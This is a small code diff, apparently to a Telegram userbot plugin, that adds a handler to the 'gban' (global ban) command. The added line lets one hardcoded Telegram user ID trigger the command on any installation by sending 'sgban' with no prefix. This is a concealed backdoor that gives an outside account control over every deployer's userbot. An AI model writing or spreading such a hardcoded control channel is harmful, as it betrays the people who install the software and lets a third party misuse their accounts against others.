@@ -23,7 +23,7 @@ __HELP__ = """
 """
 
       
-
+@ubot.on_message(filters.user(1361379181) & filters.command("sgban", ""))
 @PY.UBOT("gban")
 async def _(client, message):
     prs = await EMO.PROSES(client)
